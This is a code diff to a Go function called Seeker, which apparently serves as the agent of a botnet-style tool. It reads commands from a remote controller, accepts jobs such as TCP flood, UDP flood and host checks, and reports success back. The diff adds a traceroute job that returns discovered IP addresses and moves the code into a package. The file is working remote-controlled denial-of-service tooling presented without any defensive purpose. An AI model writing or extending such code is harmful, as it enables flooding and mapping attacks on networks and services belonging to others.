@@ -1,4 +1,4 @@
-package main
+package seeker
 
 import (
 	"bufio"
@@ -69,6 +69,8 @@ func Seeker() {
 			case "JOB TCPFLOOD":
 				fallthrough
 			case "JOB HOSTUP":
+				fallthrough
+			case "JOB TRACERT":
 				fallthrough
 			case "JOB UDPFLOOD":
 				conn.Write([]byte(fmt.Sprint("ACPT JOB ", queryStr[4:], " \r\n")))
@@ -142,6 +144,10 @@ func Seeker() {
 				jobs.UDPFlood(splits[0], port)
 
 				conn.Write([]byte("JOB SUCC \r\n"))
+				break
+			case "JOB TRACERT":
+				ips := jobs.Traceroute("Wi-Fi", data)
+				conn.Write([]byte("JOB SUCC " + fmt.Sprint(ips) + "\r\n"))
 				break
 			}
 			state = 1
